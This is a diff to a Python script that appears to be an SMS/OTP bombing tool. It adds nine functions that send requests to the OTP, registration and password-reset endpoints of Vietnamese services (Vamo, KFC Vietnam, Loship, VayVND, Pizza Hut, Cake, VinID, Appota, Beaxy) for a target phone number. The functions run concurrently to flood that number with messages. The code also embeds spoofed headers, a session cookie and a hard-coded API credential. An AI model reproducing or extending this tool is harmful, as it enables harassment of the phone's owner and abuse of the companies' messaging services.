@@ -3316,6 +3316,247 @@ def zodi(): #ap
     except requests.exceptions.RequestException:
         print("ZODI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
+def vamo():
+    cookies = {
+        'idux_session_id': '7d75abd4-1d3f-4e76-82a6-a41bce326521',
+    }
+
+    headers = {
+        'Host': 'api-app.vamo.vn',
+        # 'Cookie': 'idux_session_id=7d75abd4-1d3f-4e76-82a6-a41bce326521',
+        'wss-clientid': 'ECC10EB3-BF97-40E1-A9B1-20E18C0C9E77',
+        'accept': 'application/json, text/plain, */*',
+        'user-agent': 'Vamo/4 CFNetwork/1494.0.7 Darwin/23.4.0',
+        'accept-language': 'vi-VN,vi;q=0.9',
+    }
+
+    json_data = {
+        'phone': sdt,
+    }
+
+    try:
+        response = requests.post('https://api-app.vamo.vn/api/client/phone-verify/resend', cookies=cookies, headers=headers, json=json_data)
+        response.raise_for_status()
+        print("VAMO | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("VAMO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def kfc():
+    headers = {
+        'Host': 'api.kfcvietnam.com.vn',
+        'content-type': 'application/json',
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9',
+        'user-agent': 'KFC Vietnam/1.13.3.0001 CFNetwork/1494.0.7 Darwin/23.4.0',
+        'x-mck-key': 'bdc6ad8b-b3f4-4115-9c47-df80de5ef8c9',
+    }
+
+    json_data = {
+        'sendType': 1,
+        'phoneNumber': sdt,
+        'token': '',
+    }
+
+    try:
+        response = requests.post('https://api.kfcvietnam.com.vn/api/v1/authentication/user/login/resendotp', headers=headers, json=json_data)
+        response.raise_for_status()
+        print("KFC | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("KFC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def beaxy():
+    headers = {
+        'Host': 'api-dev.beaxy.com',
+        'Accept': 'application/json, text/plain, */*',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
+        'Content-Type': 'application/json',
+        'Origin': 'https://dev.beaxy.com',
+        'Referer': 'https://dev.beaxy.com/',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    }
+
+    json_data = {
+        'phone': sdt_chuyen_doi,
+        'code': '+84',
+    }
+
+    try:
+        response = requests.post('https://api-dev.beaxy.com/api/v2/auth/login/get/otp', headers=headers, json=json_data)
+        response.raise_for_status()
+        print("BEAXY | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("BEAXY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def loship():
+    headers = {
+        'Host': 'mocha-api.loship.vn',
+        'Content-Type': 'application/json',
+        'Origin': 'https://loship.vn',
+        'Accept': 'application/json, text/plain, */*',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
+        'Referer': 'https://loship.vn/',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    }
+
+    json_data = {
+        'phone': sdt,
+    }
+
+    try:
+        response = requests.post('https://mocha-api.loship.vn/v2/auth/register', headers=headers, json=json_data)
+        response.raise_for_status()
+        print("LOSHIP | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("LOSHIP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def vayvnd():
+    headers = {
+        'authority': 'api.vayvnd.vn',
+        'accept': 'application/json',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        'origin': 'https://vayvnd.vn',
+        'referer': 'https://vayvnd.vn/',
+        'sec-ch-ua': '"Opera";v="115", "Chromium";v="130", "Not?A_Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
+    }
+
+    json_data = {
+        'phone': sdt,
+        'utm': '',
+        'platform': 'web',
+        'captcha': '',
+    }
+
+    try:
+        response = requests.post('https://api.vayvnd.vn/v1/users/password-reset', headers=headers, json=json_data)
+        response.raise_for_status()
+        print("VAYVND | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("VAYVND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def pizzahut():
+    headers = {
+        'authority': 'api.pizzahut.vn',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'application-password': 'fajLRd7ULoo=',
+        'application-username': 'marketing',
+        'content-type': 'application/json;charset=UTF-8',
+        'origin': 'https://pizzahut.vn',
+        'referer': 'https://pizzahut.vn/',
+        'sec-ch-ua': '"Opera";v="115", "Chromium";v="130", "Not?A_Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
+    }
+
+    json_data = {
+        'phoneNumber': sdt,
+    }
+
+    try:
+        response = requests.post('https://api.pizzahut.vn/api/customer/registerCustomerCheckVnMobileExist', headers=headers, json=json_data)
+        response.raise_for_status()
+        print("PIZZAHUT | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("PIZZAHUT | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def cake():
+    headers = {
+        'authority': 'apiv2.cake.vn',
+        'accept': 'application/json',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        'origin': 'https://www.cake.vn',
+        'referer': 'https://www.cake.vn/',
+        'sec-ch-ua': '"Opera";v="115", "Chromium";v="130", "Not?A_Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
+    }
+
+    json_data = {
+        'mobile': sdt,
+        'countryCode': '84',
+        'captchaCode': '',
+        'captchaId': '',
+    }
+
+    try:
+        response = requests.post('https://apiv2.cake.vn/api/Customer/OTP', headers=headers, json=json_data)
+        response.raise_for_status()
+        print("CAKE | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("CAKE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def vinid():
+    headers = {
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/json;charset=UTF-8',
+        'Origin': 'https://id.vinid.net',
+        'Referer': 'https://id.vinid.net/auth/login',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
+        'sec-ch-ua': '"Opera";v="115", "Chromium";v="130", "Not?A_Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    json_data = {
+        'phoneNumber': sdt,
+        'language': 'vi',
+    }
+
+    try:
+        response = requests.post('https://api-account.vinid.net/api/v1/user/otp', headers=headers, json=json_data)
+        response.raise_for_status()
+        print("VINID | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("VINID | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def appota():
+    headers = {
+        'authority': 'appota.com',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json;charset=UTF-8',
+        'origin': 'https://appota.com',
+        'referer': 'https://appota.com/register',
+        'sec-ch-ua': '"Opera";v="115", "Chromium";v="130", "Not?A_Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
+    }
+
+    json_data = {
+        'phone': sdt,
+    }
+
+    try:
+        response = requests.post('https://appota.com/api/v1/sessions/send_opt_code', headers=headers, json=json_data)
+        response.raise_for_status()
+        print("APPOTA | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("APPOTA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
 functions = [
     tv360, vieon, myviettel, fptshop, befood, foodhubzl,
@@ -3335,7 +3576,8 @@ functions = [
     aio, fpt, unicar, lozido, pingpush, ting,
     kanow, butlsms, butlzl, ilokafood, vieclam24h,
     sobanhangzl, sobanhang, sfin, sapo,
-    truedoc, upos, ghephang, hoatoc247, gotp
+    truedoc, upos, ghephang, hoatoc247, gotp,
+    vamo, kfc, beaxy, loship, vayvnd, pizzahut, cake, vinid, appota
 ]
 
 with concurrent.futures.ThreadPoolExecutor() as executor:
